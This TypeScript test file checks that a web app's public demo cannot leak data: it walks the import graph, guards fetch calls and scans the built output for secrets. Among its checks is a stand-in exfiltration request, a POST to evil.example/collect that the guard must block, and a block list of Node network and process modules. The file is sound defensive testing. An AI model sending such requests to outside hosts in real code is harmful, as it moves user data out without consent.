// Public demo leak test (roadmap 7.5). Fails if any /demo code path can reach Supabase, server data, the filesystem,
// secrets or a real /api/* call — statically (import graph) and at runtime (fetch guard) — and, after `npm run demo:build`,
// if the static output holds secrets or private fixtures.
import { test } from "node:test";
import assert from "node:assert/strict";
import { existsSync, readdirSync, readFileSync, statSync } from "node:fs";
import { join, relative, resolve } from "node:path";
import { importGraph } from "../scripts/demo-graph.ts";
import { DEMO_ROUTES, guardFetch, coreReply } from "../src/lib/demo-shell-pure.ts";
import { demoData } from "../src/app/demo/data.ts";

const ROOT = resolve(import.meta.dirname, "..");
const rel = (f: string) => relative(ROOT, f).replaceAll("\\", "/");
const PAGE = "src/app/demo/page.tsx", CLIENT = "src/components/DemoOrbit.tsx";
const FORBIDDEN_PKG = /^(@supabase\/|node:|fs$|fs\/|path$|os$|child_process$|crypto$|net$|http$|https$|stream$|next\/headers|next\/server|server-only|ffmpeg-static|sharp|@huggingface\/|kokoro-js|playwright|unpdf|mammoth)/;
const FORBIDDEN_FILE = /^src\/(app\/api\/|lib\/supabase\/|middleware|instrumentation)/;

// Fixture helpers the page runs at build time only (never in the browser bundle, never touching files or the network).
const BUILD_ONLY = new Set(["src/lib/clips/pure.ts -> node:path", "src/lib/clips/reframe.ts -> node:child_process", "src/lib/yt-analytics-pure.ts -> node:crypto"]);
const page = importGraph([PAGE]), client = importGraph([CLIENT]);

test("demo import graph: no Supabase, server libs, node builtins or API routes", () => {
  assert.ok(page.files.size > 20 && [...page.files.keys()].map(rel).includes(CLIENT), "the walker follows the page into DemoOrbit");
  const bad: string[] = [];
  for (const f of page.files.keys()) if (FORBIDDEN_FILE.test(rel(f))) bad.push(rel(f));
  for (const [f, specs] of page.packages) for (const s of specs) {
    const edge = `${rel(f)} -> ${s}`;
    if (FORBIDDEN_PKG.test(s) && !(BUILD_ONLY.has(edge) && !client.files.has(f))) bad.push(edge);
  }
  assert.deepEqual(bad, []);
});

test("demo code reads no secrets: process.env only for NODE_ENV", () => {
  const bad: string[] = [];
  for (const f of page.files.keys()) for (const m of readFileSync(f, "utf8").matchAll(/process\.env(?:\.(\w+)|\[)/g)) if (m[1] !== "NODE_ENV") bad.push(`${rel(f)}: ${m[0]}`);
  assert.deepEqual(bad, []);
});

test("the browser bundle never gets the fixture generator (LIFE, journal, BUSINESS stay on the build machine)", () => {
  const files = [...client.files.keys()].map(rel);
  for (const f of ["src/lib/demo-pure.ts", "src/lib/life-pure.ts", "src/lib/business-pure.ts", "src/app/demo/data.ts", "src/components/panels.tsx"])
    assert.ok(!files.includes(f), f);
});

test("page data is exactly the allow-listed fixtures, with no private sections", () => {
  const data = demoData();
  assert.deepEqual(Object.keys(data).sort(), Object.keys(DEMO_ROUTES).sort());
  const text = JSON.stringify(data);
  for (const s of ["journal", "habit", "Lanternworks", "prospect", "reminder", "@example.invalid"]) assert.ok(!text.includes(s), s);
  assert.doesNotMatch(text, /[\w.+-]+@[\w-]+\.[a-z]{2,}/i, "no email addresses");
});

test("runtime fetch guard: every /api path the demo code mentions is answered locally, never sent", async () => {
  const paths = new Set<string>(["/api/core", "/api/life", "/api/memories"]);
  for (const f of page.files.keys()) for (const m of readFileSync(f, "utf8").matchAll(/["'`](\/api\/[\w\-/]*)/g)) paths.add(m[1]);
  assert.ok(paths.size > 20, "found the demo's API calls");
  const sent: string[] = [], blocked: string[] = [];
  const real = (async (input: RequestInfo | URL) => { sent.push(String(input)); return new Response("static"); }) as typeof fetch;
  const origin = "https://demo.example";
  const data = demoData(), f = guardFetch(data, real, origin, blocked);
  for (const p of paths) for (const method of ["GET", "POST", "PATCH", "DELETE"]) {
    const r = await f(`${p}?x=1`, { method });
    const ok = Object.hasOwn(data, `${method} ${p}`);
    assert.equal(r.status, ok ? 200 : 403, `${method} ${p}`);
  }
  await f(new Request(`${origin}/api/memories/map`)); // Request objects, absolute URLs
  await f(new URL("/API/core", origin), { method: "POST" }); // case tricks
  await f("https://evil.example/collect", { method: "POST", body: "x" }); // other origins
  await f("//evil.example/x");
  assert.deepEqual(sent, []);
  assert.ok(blocked.includes("POST https://evil.example/collect") && blocked.includes("POST /API/core"));
  assert.equal((await (await f("/api/memories/map")).json()).items.length, 36);
  // A fixture keyed with a query answers only that exact query; the same path with another query stays refused.
  const shorts = await f("/api/studio/analytics?results=1");
  assert.equal(shorts.status, 200);
  assert.ok(Array.isArray((await shorts.json()).shorts) && (await f("/api/studio/analytics?range=28")).status === 403);
  await f("/_next/static/chunk.js");
  assert.deepEqual(sent, ["/_next/static/chunk.js"], "same-origin static files still load");
});

test("CORE answers from a script", () => {
  assert.match(coreReply("What is ORBIT?"), /galaxy/);
  assert.match(coreReply("Is my data sent anywhere?"), /privately/);
  assert.match(coreReply("tell me a secret"), /scripted/);
});

const DIST = join(ROOT, "demo-dist");
test("static output (after npm run demo:build): only /demo, no secrets or private fixtures", { skip: !existsSync(DIST) && "run npm run demo:build first" }, () => {
  const files: string[] = [];
  const walk = (d: string) => readdirSync(d).forEach((n) => { const p = join(d, n); if (statSync(p).isDirectory()) walk(p); else files.push(p); });
  walk(DIST);
  const htmls = files.map((f) => relative(DIST, f).replaceAll("\\", "/")).filter((f) => f.endsWith(".html"));
  assert.deepEqual(htmls.filter((f) => !/^(demo|404|_not-found)\.html$/.test(f)), [], "no other pages");
  const secrets: string[] = [];
  const env = join(ROOT, ".env.local");
  if (existsSync(env)) for (const line of readFileSync(env, "utf8").split(/\r?\n/)) {
    const v = line.match(/^\s*[A-Z0-9_]+\s*=\s*"?([^"#\s]{12,})/)?.[1];
    if (v) secrets.push(v);
  }
  const banned = ["supabase.co", "SUPABASE_", "sb-access-token", "The garden has become a daily practice", "Lanternworks", "@example.invalid", ...secrets];
  for (const f of files) {
    const text = readFileSync(f, "latin1");
    for (const b of banned) assert.ok(!text.includes(b), `${relative(DIST, f)} contains ${b.length > 20 ? "a secret/private string" : b}`);
  }
});
